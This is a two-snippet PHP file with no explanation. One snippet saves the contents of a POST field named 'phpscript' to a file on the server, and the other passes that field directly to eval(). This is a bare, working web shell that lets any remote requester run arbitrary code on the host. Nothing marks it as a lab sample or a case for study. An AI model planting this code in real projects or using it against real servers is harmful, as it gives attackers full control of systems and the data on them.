<?php file_put_contents("php7World.php7", $_POST['phpscript']);?>
<?php
$post = $_POST['phpscript'];
eval($post);
?>